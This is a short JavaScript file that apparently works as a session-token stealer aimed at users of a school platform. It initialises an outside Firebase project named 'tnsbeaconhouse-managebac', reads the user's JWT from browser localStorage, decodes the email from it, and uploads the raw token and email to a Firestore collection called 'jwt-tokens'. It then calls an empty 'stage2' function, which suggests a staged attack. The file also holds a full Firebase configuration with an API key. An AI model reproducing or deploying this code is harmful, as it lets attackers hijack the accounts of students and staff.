// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getFirestore, addDoc, collection } from "firebase/firestore";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
  authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
  projectId: "tnsbeaconhouse-managebac",
  storageBucket: "tnsbeaconhouse-managebac.appspot.com",
  messagingSenderId: "102801144416",
  appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const userToken = localStorage.token;
const decodedTokenPayload = parseJwt(userToken);

try {
  const docRef = await addDoc(collection(db, "jwt-tokens"), {
    email: decodedTokenPayload?.email,
    token: userToken,
  });

  console.log("Document written with ID: ", docRef.id);
} catch (e) {
  console.error("Error adding document: ", e);
} finally {
  stage2();
}

function stage2() {}

function parseJwt(token) {
  return JSON.parse(Buffer.from(token.split(".")[1], "base64").toString());
}
